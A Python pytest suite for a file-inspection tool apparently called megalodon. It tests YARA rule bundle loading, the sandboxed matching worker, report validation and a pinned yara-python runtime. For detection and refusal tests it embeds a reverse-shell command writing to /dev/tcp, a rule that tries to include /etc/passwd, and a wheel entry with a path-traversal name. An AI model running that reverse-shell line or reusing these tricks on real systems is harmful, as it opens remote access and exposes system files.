"""Operator YARA rules: bounded host bundle, sandboxed worker step, report and HUD contract."""
from __future__ import annotations

import hashlib
import io
import json
import os
from pathlib import Path
import stat
import sys
from threading import Event
import time
import types
import zipfile

import pytest

from megalodon import file_inspection_contract as contract
from megalodon import file_inspection_sandbox as sandbox
from megalodon import yara_rules, yara_runtime
from megalodon.file_inspection import FileInspection

ROOT = Path(__file__).resolve().parents[1]
STRUCTURE = dict(format='ELF', slices_detected=1, slices=[dict(
    architecture='X86_64', bits=64, sections=3, imports=2, writable_executable=0)])
PROBE = dict(network=True, fork=True, host_read=True, host_write=True, execute_input=True)
SEALS = hasattr(__import__('fcntl'), 'F_ADD_SEALS')
needs_seals = pytest.mark.skipif(not SEALS, reason='memfd sealing unavailable in this Python build')


def folder(tmp_path, files=None, mode=0o700):
    path = tmp_path / 'yara-rules'
    path.mkdir(mode=mode)
    path.chmod(mode)
    for name, text in (files or {}).items():
        (path / name).write_text(text, encoding='utf-8')
        (path / name).chmod(0o600)
    return path


# ---- host-side bundle -------------------------------------------------------

def test_missing_or_empty_folder_is_not_configured(tmp_path):
    assert yara_rules.load(tmp_path / 'absent') is None
    assert yara_rules.load(folder(tmp_path, {'README.md': 'notes', '.hidden.yar': 'rule A {condition:true}'})) is None
    assert yara_rules.load(home=tmp_path) is None


def test_bundle_reads_rule_files_as_namespaces_with_a_stable_digest(tmp_path):
    path = folder(tmp_path, {'shells.yar': 'rule A { condition: true }', 'web-1.yara': 'rule B { condition: false }',
                             'notes.txt': 'ignored'})
    bundle = yara_rules.load(path)
    assert bundle['files'] == 2 and sorted(bundle['sources']) == ['shells', 'web-1']
    assert bundle['digest'] == hashlib.sha256(yara_rules.bundle_bytes(bundle['sources'])).hexdigest()
    assert contract.parse_bundle(yara_rules.bundle_bytes(bundle['sources'])) == bundle['sources']
    # The default folder lives under the home directory.
    assert yara_rules.rules_dir(tmp_path) == tmp_path / '.config/megalodon/yara-rules'


def test_unsafe_folders_and_files_are_refused_not_skipped(tmp_path):
    link = tmp_path / 'link'
    link.symlink_to(folder(tmp_path, {'a.yar': 'rule A {condition:true}'}))
    with pytest.raises(yara_rules.RulesError, match='real directory'):
        yara_rules.load(link)
    shared = tmp_path / 'shared'
    shared.mkdir()
    shared.chmod(0o777)
    with pytest.raises(yara_rules.RulesError, match='not writable by others'):
        yara_rules.load(shared)


@pytest.mark.parametrize('kind', ['symlink', 'fifo', 'large', 'binary', 'nul', 'name', 'writable', 'duplicate'])
def test_each_unsafe_rule_file_refuses_the_bundle(tmp_path, kind):
    path = folder(tmp_path, {'good.yar': 'rule Good { condition: true }'})
    target = path / 'bad.yar'
    if kind == 'symlink':
        (tmp_path / 'outside.yar').write_text('rule X {condition:true}')
        target.symlink_to(tmp_path / 'outside.yar')
    elif kind == 'fifo':
        os.mkfifo(target)
    elif kind == 'large':
        target.write_bytes(b'/' * (contract.MAX_RULE_FILE + 1))
    elif kind == 'binary':
        target.write_bytes(b'rule \xff')
    elif kind == 'nul':
        target.write_bytes(b'rule A\x00')
    elif kind == 'name':
        (path / 'bad name.yar').write_text('rule A {condition:true}')
    elif kind == 'writable':
        target.write_text('rule A {condition:true}')
        target.chmod(0o666)
    else:
        (path / 'good.yara').write_text('rule Other {condition:true}')
    started = time.monotonic()
    with pytest.raises((yara_rules.RulesError, OSError)):
        yara_rules.load(path)
    assert time.monotonic() - started < 5, 'a FIFO must not block the reader'


def test_bundle_count_and_total_size_are_bounded(tmp_path):
    many = folder(tmp_path, {f'r{i}.yar': 'rule A {condition:true}' for i in range(contract.MAX_RULE_FILES + 1)})
    with pytest.raises(yara_rules.RulesError, match='more than'):
        yara_rules.load(many)
    big = tmp_path / 'big'
    big.mkdir(mode=0o700)
    for i in range(5):
        (big / f'r{i}.yar').write_bytes(b'/' * contract.MAX_RULE_FILE)
    with pytest.raises(yara_rules.RulesError, match='4 MiB'):
        yara_rules.load(big)


def test_parse_bundle_refuses_shapes_the_host_never_builds():
    good = yara_rules.bundle_bytes({'a': 'rule A {condition:true}'})
    assert contract.parse_bundle(good) == {'a': 'rule A {condition:true}'}
    for raw in (b'{}', json.dumps(dict(schema='other', sources={'a': 'x'})).encode(),
                json.dumps(dict(schema=contract.BUNDLE_SCHEMA, sources={})).encode(),
                json.dumps(dict(schema=contract.BUNDLE_SCHEMA, sources={'../x': 'x'})).encode(),
                json.dumps(dict(schema=contract.BUNDLE_SCHEMA, sources={'a': 1})).encode(),
                json.dumps(dict(schema=contract.BUNDLE_SCHEMA, sources={'a': 'x'}, extra=1)).encode(),
                b'{"schema":"megalodon-yara-bundle-v1","sources":{"a":"x","a":"y"}}'):
        with pytest.raises(ValueError):
            contract.parse_bundle(raw)


# ---- report contract --------------------------------------------------------

def matches(n, namespace='shells'):
    return [dict(namespace=namespace, rule=f'Rule_{i}', tags=['net'] if i == 0 else []) for i in range(n)]


def test_rules_section_carries_only_identifiers_and_bounded_counts():
    assert contract.validate_rules(dict(state='completed', rule_count=40, matched=34, matches=matches(32)))
    for bad in (dict(state='completed', rule_count=3, matched=4, matches=matches(4)),
                dict(state='completed', rule_count=40, matched=34, matches=matches(31)),
                dict(state='completed', rule_count=2, matched=2, matches=matches(1) * 2),
                dict(state='completed', rule_count=1, matched=1, matches=[dict(namespace='a', rule='<b>', tags=[])]),
                dict(state='completed', rule_count=1, matched=1, matches=[dict(namespace='a', rule='A', tags=['x y'])]),
                dict(state='completed', rule_count=1, matched=1,
                     matches=[dict(namespace='a', rule='A', tags=[], strings=['secret'])]),
                dict(state='invalid_rules', rule_count=3, matched=0, matches=[]),
                dict(state='safe', rule_count=0, matched=0, matches=[])):
        with pytest.raises(ValueError):
            contract.validate_rules(bad)


@pytest.mark.parametrize('states,rules,expected', [
    (['completed', 'completed'], None, 'completed'),
    (['completed', 'completed'], dict(state='completed', rule_count=1, matched=0, matches=[]), 'completed'),
    (['completed', 'completed'], dict(state='invalid_rules'), 'partial'),
    (['completed', 'completed'], dict(state='unavailable'), 'partial'),
    (['unsupported', 'unsupported'], dict(state='completed', rule_count=1, matched=1, matches=matches(1)), 'partial'),
    (['unsupported', 'unsupported'], dict(state='timed_out'), 'unsupported'),
    (['unsupported', 'unsupported'], None, 'unsupported'),
    (['failed', 'failed'], dict(state='failed'), 'failed'),
    (['completed', 'completed'], dict(state='cancelled'), 'cancelled'),
])
def test_report_state_counts_rules_only_once_configured(states, rules, expected):
    results = [dict(state=states[0], structure=STRUCTURE) if states[0] == 'completed' else dict(state=states[0]),
               dict(state=states[1], identification=[]) if states[1] == 'completed' else dict(state=states[1])]
    value = contract.report(64, results, rules)
    assert value['schema'] == 'megalodon-file-inspection-report-v2'
    assert value['state'] == expected
    assert ('rule_match' in [c['code'] for c in value['clues']]) == bool(value['rules']['matched'])
    tampered = json.loads(json.dumps(value))
    tampered['clues'] = [c for c in tampered['clues'] if c['code'] != 'rule_match'] if value['rules']['matched'] else \
        tampered['clues'] + [dict(code='rule_match', title=contract.CLUES['rule_match'][0],
                                  meaning=contract.CLUES['rule_match'][1])]
    with pytest.raises(ValueError):
        contract.validate_report(tampered)


# ---- sandboxed worker step (fake yara module; native rehearsal is opt-in) ----

@pytest.fixture
def worker(monkeypatch):
    monkeypatch.syspath_prepend(str(ROOT / 'megalodon'))
    import file_inspection_worker
    return file_inspection_worker


def fake_yara(monkeypatch, *, compile_error=False, timeout=False, found=()):
    module = types.ModuleType('yara')

    class Error(Exception):
        pass

    class TimeoutError(Error):  # noqa: A001 - mirrors yara-python
        pass

    calls = {}

    class Rules:
        def __iter__(self):
            return iter(range(40))

        def match(self, target, **kwargs):
            calls['match'] = (target, kwargs)
            if timeout:
                raise TimeoutError()
            return list(found)

    def compile(**kwargs):  # noqa: A001
        calls['compile'] = kwargs
        if compile_error:
            raise Error('line 1: syntax error')
        return Rules()

    module.Error, module.TimeoutError, module.compile = Error, TimeoutError, compile
    monkeypatch.setitem(sys.modules, 'yara', module)
    return calls


def bundle_file(tmp_path, sources=None):
    path = tmp_path / 'bundle.json'
    path.write_bytes(yara_rules.bundle_bytes(sources or {'shells': 'rule A {condition:true}'}))
    return str(path)


def test_worker_compiles_without_includes_and_keeps_only_identifiers(worker, monkeypatch, tmp_path):
    hit = lambda i: types.SimpleNamespace(namespace='shells', rule=f'Rule_{i}', tags=['net', 'net', 'shell'],  # noqa: E731
                                          strings=['SECRET'], meta={'author': 'x'})
    calls = fake_yara(monkeypatch, found=[hit(i) for i in range(34)])
    result = worker.inspect_yara(bundle_file(tmp_path), '/input/program', None)
    assert calls['compile']['includes'] is False and calls['compile']['sources'] == {'shells': 'rule A {condition:true}'}
    target, options = calls['match']
    assert target == '/input/program' and options['timeout'] == 10 and options['fast'] is True
    assert options['console_callback']('ignored') is None
    assert result['state'] == 'completed' and result['rule_count'] == 40 and result['matched'] == 34
    assert len(result['matches']) == 32 and result['matches'][0] == dict(namespace='shells', rule='Rule_0', tags=['net', 'shell'])
    assert 'SECRET' not in json.dumps(result)


def test_worker_reports_compile_errors_and_timeouts_as_states(worker, monkeypatch, tmp_path):
    fake_yara(monkeypatch, compile_error=True)
    assert worker.inspect_yara(bundle_file(tmp_path), '/x', None) == {'state': 'invalid_rules'}
    fake_yara(monkeypatch, timeout=True)
    assert worker.inspect_yara(bundle_file(tmp_path), '/x', None) == {'state': 'timed_out'}


def test_worker_main_dispatches_only_the_fixed_yara_argument(worker, monkeypatch, capsys):
    monkeypatch.setattr(worker, 'inspect_yara', lambda: {'state': 'invalid_rules'})
    monkeypatch.setattr(worker, 'inspect_lief', lambda: {'state': 'unsupported'})
    for argv, expected in ((['w', 'yara'], 'invalid_rules'), (['w'], 'unsupported'), (['w', 'other'], 'unsupported')):
        monkeypatch.setattr(sys, 'argv', argv)
        worker.main()
        assert json.loads(capsys.readouterr().out) == {'state': expected}


@pytest.mark.skipif(not os.environ.get('MEGALODON_TEST_YARA_TREE'),
                    reason='Set MEGALODON_TEST_YARA_TREE to an assembled yara runtime python/ directory')
def test_worker_with_the_real_yara_library(worker, tmp_path):
    sample = tmp_path / 'sample'
    sample.write_bytes(b'\x7fELF' + b'\0' * 60 + b'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1')
    sources = {'shells': 'rule RevShell : net { strings: $a = "/dev/tcp/" condition: $a }\nrule Never { condition: false }',
               'console': 'import "console"\nrule Talk { condition: console.log("hi") }'}
    result = worker.inspect_yara(bundle_file(tmp_path, sources), str(sample), os.environ['MEGALODON_TEST_YARA_TREE'])
    assert result == dict(state='completed', rule_count=3, matched=2, matches=[
        dict(namespace='console', rule='Talk', tags=[]), dict(namespace='shells', rule='RevShell', tags=['net'])])
    assert worker.inspect_yara(bundle_file(tmp_path, {'a': 'include "/etc/passwd"\nrule A {condition:true}'}),
                               str(sample), os.environ['MEGALODON_TEST_YARA_TREE']) == {'state': 'invalid_rules'}


# ---- host scan step and FileInspection integration ---------------------------

def test_normalize_accepts_only_contract_shapes():
    good = dict(state='completed', rule_count=2, matched=1, matches=matches(1))
    assert yara_rules.normalize(json.dumps(good).encode()) == good
    assert yara_rules.normalize(b'{"state":"invalid_rules"}')['state'] == 'invalid_rules'
    for raw in (b'{"state":"completed"}', b'{"state":"invalid_rules","why":"x"}', b'[]', b'{"state":"safe"}'):
        with pytest.raises(ValueError):
            yara_rules.normalize(raw)


def test_scan_without_rules_never_starts_the_sandbox(tmp_path):
    def runner(*args, **kwargs):
        raise AssertionError('no rules, no sandbox')
    assert yara_rules.scan(tmp_path, 0, Event(), runner=runner)['state'] == 'not_configured'
    unsafe = folder(tmp_path / 'x' if (tmp_path / 'x').mkdir() is None else tmp_path, mode=0o777)
    assert yara_rules.scan(tmp_path, 0, Event(), runner=runner, directory=unsafe)['state'] == 'invalid_rules'
    rules = {'sources': {'a': 'rule A {condition:true}'}}
    assert yara_rules.scan(tmp_path, 0, Event(), runner=runner, loader=lambda *_a, **_k: rules,
                           validator=lambda _h: (_ for _ in ()).throw(ValueError('missing')))['state'] == 'unavailable'
    cancelled = Event()
    cancelled.set()
    assert yara_rules.scan(tmp_path, 0, cancelled, runner=runner, loader=lambda *_a, **_k: rules,
                           validator=lambda _h: tmp_path)['state'] == 'cancelled'


@needs_seals
@pytest.mark.parametrize('state,raw,expected', [
    ('completed', json.dumps(dict(state='completed', rule_count=1, matched=1, matches=matches(1))).encode(), 'completed'),
    ('completed', b'{"state":"invalid_rules"}', 'invalid_rules'),
    ('completed', b'not json', 'failed'),
    ('timed_out', b'', 'timed_out'), ('unavailable', b'', 'unavailable'), ('failed', b'', 'failed'),
])
def test_scan_passes_a_sealed_bundle_and_maps_outcomes(tmp_path, state, raw, expected):
    seen = {}

    def runner(root, fd, tool, *, deadline, cancelled, probe=None, rules=None):
        seen.update(root=root, tool=tool, budget=deadline - time.monotonic())
        os.lseek(rules, 0, os.SEEK_SET)
        seen['bundle'] = os.read(rules, 1 << 20)
        with pytest.raises(PermissionError):
            os.write(rules, b'x')
        return state, raw

    path = folder(tmp_path, {'shells.yar': 'rule A { condition: true }'})
    result = yara_rules.scan(tmp_path, 0, Event(), runner=runner, directory=path, validator=lambda _h: tmp_path / 'yara')
    assert result['state'] == expected
    assert seen['tool'] == 'yara' and seen['root'] == tmp_path / 'yara' and 0 < seen['budget'] <= yara_rules.DEADLINE
    assert contract.parse_bundle(seen['bundle']) == {'shells': 'rule A { condition: true }'}


def inspection(rules_state, raw, structure_state='completed'):
    calls = []

    def runner(root, fd, tool, *, deadline, cancelled, probe=None, rules=None):
        calls.append(tool if probe is None else 'probe')
        if probe:
            return 'completed', json.dumps(PROBE).encode()
        if tool == 'lief':
            if structure_state == 'unsupported':
                return 'completed', b'{"state":"unsupported"}'
            return 'completed', json.dumps(dict(state='completed', structure=STRUCTURE)).encode()
        if tool == 'die':
            return 'completed', b'{"detects":[{"filetype":"ELF64","info":"","offset":"0","parentfilepart":"Header","size":"4","values":[]}]}'
        assert rules is not None
        return rules_state, raw

    service = FileInspection(runner=runner, validator=lambda _: Path('/unused'),
                             rules_loader=lambda *_a, **_k: {'sources': {'web': 'rule WebShell {condition:true}'}},
                             yara_validator=lambda _h: Path('/yara'))
    job, fd, root = service.reserve(4)
    os.write(fd, b'\x7fELF')
    assert service.submit(job, fd, 4, root)
    deadline = time.monotonic() + 5
    while service.snapshot()['state'] in ('receiving', 'running'):
        assert time.monotonic() < deadline
        time.sleep(.005)
    return service.snapshot(), calls


@needs_seals
def test_inspection_applies_rules_after_structure_and_reports_matches():
    hit = json.dumps(dict(state='completed', rule_count=1, matched=1,
                          matches=[dict(namespace='web', rule='WebShell', tags=['php'])])).encode()
    snapshot, calls = inspection('completed', hit)
    assert calls == ['probe', 'lief', 'die', 'yara']
    report = snapshot['report']
    assert report['state'] == 'completed' and report['rules']['matched'] == 1
    assert [c['code'] for c in report['clues']] == ['rule_match']
    contract.validate_report(report)


@needs_seals
def test_rules_still_cover_files_without_a_supported_structure():
    hit = json.dumps(dict(state='completed', rule_count=1, matched=1,
                          matches=[dict(namespace='web', rule='WebShell', tags=[])])).encode()
    snapshot, calls = inspection('completed', hit, structure_state='unsupported')
    assert calls == ['probe', 'lief', 'yara']
    assert snapshot['state'] == 'partial' and snapshot['report']['state'] == 'partial'


@needs_seals
def test_failed_confinement_reports_rules_as_not_applied():
    service = FileInspection(runner=lambda *a, **k: ('failed', b''), validator=lambda _: Path('/unused'),
                             rules_loader=lambda *_a, **_k: {'sources': {'a': 'rule A {condition:true}'}})
    job, fd, root = service.reserve(4)
    os.write(fd, b'\x7fELF')
    assert service.submit(job, fd, 4, root)
    deadline = time.monotonic() + 5
    while service.snapshot()['state'] in ('receiving', 'running'):
        assert time.monotonic() < deadline
        time.sleep(.005)
    assert service.snapshot()['report']['rules']['state'] == 'unavailable'


# ---- sandbox wiring -----------------------------------------------------------

def test_yara_argv_binds_the_sealed_bundle_and_fixed_worker(monkeypatch, tmp_path):
    monkeypatch.setattr(sandbox, 'supported', lambda: True)
    real_stat = Path.stat

    def owned(self, *args, **kwargs):
        # Prerequisites need not exist here; argv construction is what is checked.
        try:
            mode = real_stat(self, *args, **kwargs).st_mode & ~0o022
        except FileNotFoundError:
            mode = 0o100755
        return types.SimpleNamespace(st_uid=0, st_mode=mode)
    monkeypatch.setattr(Path, 'stat', owned)
    argv = sandbox.command(tmp_path, 5, 6, 'yara', rules_fd=7)
    assert argv[-4:] == [str(Path(sys.executable).resolve()), '-I', '/worker/file_inspection_worker.py', 'yara']
    at = argv.index('/rules/bundle.json')
    assert argv[at - 3:at] == ['0400', '--ro-bind-data', '7'] and argv[at - 4] == '--perms'
    assert argv[argv.index('/runtime') - 1] == str(tmp_path)
    assert '/rules/bundle.json' not in sandbox.command(tmp_path, 5, 6, 'lief', rules_fd=7)
    with pytest.raises(ValueError):
        sandbox.command(tmp_path, 5, 6, 'yara')


# ---- pinned runtime ------------------------------------------------------------

def test_catalog_pins_both_supported_pythons():
    value = yara_runtime.catalog()
    assert set(value['artifacts']) == set(value['trees']) == {'cp311', 'cp312'}
    for item in value['artifacts'].values():
        assert item['url'].startswith('https://files.pythonhosted.org/') and len(item['sha256']) == 64
        assert 'yara_python-' + value['versions']['yara-python'] in item['url']
    assert 'yara-runtime.json' in (ROOT / 'pyproject.toml').read_text()


def synthetic_wheel(path, tag='cp312', extra=()):
    with zipfile.ZipFile(path, 'w') as archive:
        archive.writestr(f'yara.cpython-{tag[2:]}-x86_64-linux-gnu.so', b'ELF module')
        archive.writestr('yara_python.libs/libcrypto-0ec7d250.so.1.1', b'ELF crypto')
        archive.writestr('yara_python-4.5.4.dist-info/licenses/LICENSE', b'Apache-2.0')
        archive.writestr('yara_python-4.5.4.dist-info/RECORD', b'unused')
        for name in extra:
            archive.writestr(name, b'#!/bin/sh')


def test_assemble_extracts_only_the_closed_file_set(tmp_path):
    synthetic_wheel(tmp_path / 'w.whl', extra=('evil.py', 'yara_python.libs/../../escape.so'))
    root = tmp_path / 'root'
    root.mkdir(mode=0o700)
    with pytest.raises(ValueError):
        yara_runtime.assemble(tmp_path / 'w.whl', root, 'cp312')
    synthetic_wheel(tmp_path / 'ok.whl', extra=('evil.py',))
    clean = tmp_path / 'clean'
    clean.mkdir(mode=0o700)
    yara_runtime.assemble(tmp_path / 'ok.whl', clean, 'cp312')
    files = sorted(p.relative_to(clean).as_posix() for p in clean.rglob('*') if p.is_file())
    assert files == ['python/yara.cpython-312-x86_64-linux-gnu.so', 'python/yara_python-4.5.4.dist-info/licenses/LICENSE',
                     'python/yara_python.libs/libcrypto-0ec7d250.so.1.1']
    assert all(stat.S_IMODE(p.stat().st_mode) == 0o400 for p in clean.rglob('*') if p.is_file())


def test_install_refuses_an_artifact_that_does_not_match_its_pin(tmp_path, monkeypatch):
    monkeypatch.setattr(yara_runtime, 'supported', lambda: True)
    monkeypatch.setattr(yara_runtime, '_tag', lambda: 'cp312')

    def acquire(item, destination):
        destination.write_bytes(b'not the reviewed wheel')
    with pytest.raises(ValueError, match='identity mismatch'):
        yara_runtime.install(tmp_path, acquire=acquire)
    assert not yara_runtime.runtime_path(tmp_path).exists()


def test_cli_check_reports_folder_state(tmp_path, capsys):
    from megalodon.cli import main

    def code(*argv):
        with pytest.raises(SystemExit) as exit_:
            main(list(argv))
        return exit_.value.code
    path = folder(tmp_path, {'shells.yar': 'rule A { condition: true }'})
    assert code('yara', 'check', '--dir', str(path)) == 0
    result = json.loads(capsys.readouterr().out)
    assert result['files'] == 1 and result['namespaces'] == ['shells'] and len(result['digest']) == 64
    (path / 'bad.yar').symlink_to(path / 'shells.yar')
    assert code('yara', 'check', '--dir', str(path)) == 2
